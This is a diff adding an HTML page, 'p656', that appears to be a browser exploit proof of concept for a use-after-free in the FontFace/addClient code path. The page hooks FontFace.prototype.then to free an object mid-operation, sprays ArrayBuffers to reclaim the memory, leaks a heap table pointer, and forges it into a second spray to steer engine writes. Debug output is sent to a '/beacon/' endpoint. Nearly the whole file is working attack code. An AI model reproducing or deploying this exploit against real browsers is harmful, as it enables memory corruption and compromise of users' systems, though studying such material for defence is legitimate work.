@@ -1,0 +1,246 @@
+<!--
+  p656: Two-phase FontFace addClient forge test
+
+  KEY INSIGHT: addClient writes during initializeWrapper (trap continuation),
+  NOT during the destructor. If +0x58 (m_table) is non-null in the spray,
+  HashSet::add() uses the existing table pointer instead of allocating new.
+
+  Phase 1: Normal UAF → spray with +0x58=0 → engine allocates T1 → read T1
+  Phase 2: Second UAF → spray with +0x58=T1 → addClient inserts into T1's table
+
+  Success criteria:
+    - Phase 2 hit buffer's +0x58 still equals T1 after continuation
+    - No crash (T1 metadata valid: kc=1, mask=7, size=8)
+    - rc = seed+1 (ref() ran)
+
+  If +0x58 == T1 after continuation → FORGE CONFIRMED
+  If +0x58 != T1 → engine overwrote it (forge failed)
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656</title></head>
+<body>p656: two-phase forge
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'v1-twophase');
+flush();
+
+// --- State ---
+var phase = 0;
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var sty2 = null;
+
+// Phase 1 CSS face
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+// Phase 1 JS face
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+// Unified trap
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      // Phase 1: normal spray, +0x58 = 0 (let engine allocate T)
+      sty1.remove();
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);       // seed rc=2
+        dv.setUint32(0x04, 0xAAAA0001, true); // P1 marker
+        // +0x58 stays 0 → addClient allocates fresh table
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=' + bufs1.length);
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      // Phase 2: forged spray, +0x58 = T1
+      sty2.remove();
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 5, true);       // seed rc=5
+        dv.setUint32(0x04, 0xBBBB0002, true); // P2 marker
+        // FORGE: set +0x58 = T1 so addClient uses Phase 1's table
+        dv.setUint32(0x58, T1_lo, true);
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=' + bufs2.length + ' forge=T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+// --- Trigger Phase 1 ---
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+// --- Phase 1 analysis ---
+setTimeout(function() {
+try {
+  // Find Phase 1 hit
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var i = 0; i < bufs1.length; i++) {
+      if (bufs1[i].dv.getUint32(0x58, true) !== 0 || bufs1[i].dv.getUint32(0x5C, true) !== 0) {
+        hit1 = i; break;
+      }
+    }
+  }
+
+  if (hit1 < 0) {
+    emit('P1-MISS', 'no reclaim');
+    flush();
+    return;
+  }
+
+  var dv1 = bufs1[hit1].dv;
+  var rc1 = dv1.getUint32(0x00, true);
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  var W1_lo = dv1.getUint32(0x68, true);
+  var W1_hi = dv1.getUint32(0x6C, true);
+
+  emit('P1-HIT', 'hit=' + hit1 + ' rc=' + rc1);
+  emit('P1-TW', 'T1=' + hex32(T1_hi) + hex32(T1_lo) + ' W1=' + hex32(W1_hi) + hex32(W1_lo));
+
+  if (T1_lo === 0 && T1_hi === 0) {
+    emit('P1-FAIL', 'T1 is null — engine did not write table pointer');
+    flush();
+    return;
+  }
+  flush();
+
+  // --- Setup Phase 2 ---
+  sty2 = document.createElement('style');
+  sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+  document.head.appendChild(sty2);
+
+  var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+  document.fonts.add(ffB);
+  void ffB.loaded;
+
+  phase = 2;
+
+  // Trigger Phase 2
+  document.fonts.load('1em fb, sb', 'CD');
+
+  emit('P2-TRIGGER', 'fonts.load sent');
+  flush();
+
+  // --- Phase 2 analysis ---
+  setTimeout(function() {
+  try {
+    // Find Phase 2 hit
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 5) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      // Check +0x68 (W2 written by engine)
+      for (var i = 0; i < bufs2.length; i++) {
+        if (bufs2[i].dv.getUint32(0x68, true) !== 0 || bufs2[i].dv.getUint32(0x6C, true) !== 0) {
+          hit2 = i; break;
+        }
+      }
+    }
+
+    if (hit2 < 0) {
+      emit('P2-MISS', 'no reclaim in Phase 2');
+      flush();
+
+      // Diagnostic: did trap2 fire?
+      emit('P2-DIAG', 'bufs2=' + bufs2.length + ' phase=' + phase);
+      if (bufs2.length === 0) {
+        emit('P2-DIAG2', 'trap2 never fired');
+      }
+      flush();
+      return;
+    }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0x00, true);
+    var mk2 = dv2.getUint32(0x04, true);
+    var final58_lo = dv2.getUint32(0x58, true);
+    var final58_hi = dv2.getUint32(0x5C, true);
+    var W2_lo = dv2.getUint32(0x68, true);
+    var W2_hi = dv2.getUint32(0x6C, true);
+    var st85 = dv2.getUint8(0x85);
+
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' mark=0x' + hex32(mk2));
+    emit('P2-58', 'final +0x58=' + hex32(final58_hi) + hex32(final58_lo));
+    emit('P2-W2', 'W2=' + hex32(W2_hi) + hex32(W2_lo) + ' +85=0x' + st85.toString(16));
+
+    // THE KEY CHECK
+    var forgeHeld = (final58_lo === T1_lo && final58_hi === T1_hi);
+
+    if (forgeHeld) {
+      emit('FORGE', '*** CONFIRMED *** +0x58 == T1 — addClient used forged table!');
+
+      // Extra: check if T2 would have been different (W2 proves engine ran)
+      var engineRan = (W2_lo !== 0 || W2_hi !== 0);
+      emit('ENGINE', 'W2 written=' + engineRan + ' rc=seed+1=' + (rc2 === 6));
+
+      // Check Phase 1 buffer — did Phase 2 corrupt it?
+      var rc1_now = dv1.getUint32(0x00, true);
+      var p1_58_lo = dv1.getUint32(0x58, true);
+      var p1_58_hi = dv1.getUint32(0x5C, true);
+      emit('P1-POST', 'rc1=' + rc1_now + ' +0x58=' + hex32(p1_58_hi) + hex32(p1_58_lo));
+
+    } else {
+      emit('FORGE', 'FAILED — engine overwrote +0x58');
+      emit('FORGE-DIFF', 'expected=' + hex32(T1_hi) + hex32(T1_lo) +
+        ' got=' + hex32(final58_hi) + hex32(final58_lo));
+
+      // Is the new value a valid heap pointer? (T2)
+      var looksLikeT2 = (final58_hi >= 0x00000010 && final58_hi < 0x00001000);
+      emit('T2-CHECK', 'looks-like-heap=' + looksLikeT2);
+    }
+
+    flush();
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,200)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,200)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
